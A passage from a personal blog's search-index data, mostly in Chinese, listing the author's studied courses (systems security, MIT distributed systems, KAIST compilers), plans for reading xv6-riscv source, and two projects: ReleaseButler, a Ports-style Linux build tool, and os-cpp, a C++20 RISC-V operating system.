Systems Security CSE 466 - Fall 2024 MIT 6.824: Distributed System 6.5840: Distributed Systems 简介 | MIT6.824 KAIST CS220: Programming Principles KAIST CS220: Programming Principles KAIST CS420: Compiler Design KAIST CS420: Compiler Design 把 xv6-riscv 源码阅读的坑填上 已经完成了用户态的部分，现在就差内核态了 现在正在赶 os-cpp 的进度，应该得等到 os-cpp 写的差不多了再更新了 等我有时间的吧 ","date":"0001-01-01","objectID":"/about/:1:1","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"Project ReleaseButler: 基于 GitHub 类 Ports 构建系统 Ports 是 *BSD 使用的一种系统，可以自动下载源代码、解压缩、打补丁、编译和安装软件。ReleaseButler 基于该理念，能够自动检测 Linux 发行版并构建软件，同时记录安装信息，方便用户快速重现配置环境。 设计并实现系统检测功能，确保跨 Linux 发行版的兼容性 开发了软件环境复现功能，显著提升了开发效率 项目链接: https://github.com/suoyuan666/ReleaseButler os-cpp : 使用 C++20 编写的 RISC-V 为后端的操作系统 os-cpp 是一个使用 C++20 标准，目标 CPU 架构为 RISC-V 的类 Unix 操作系统 项目链接: https://github.com/suoyuan666/os-cpp ","date":"0001-01-01","objectID":"/about/:1:2","tags":null,"title":"","uri":"/about/"},{"categories":null,"content":"友情链接 光溯星河 secrun ","date":"0001-01-01","objectID":"/friends/:1:0","tags":null,"title":"","uri":"/friends/"}]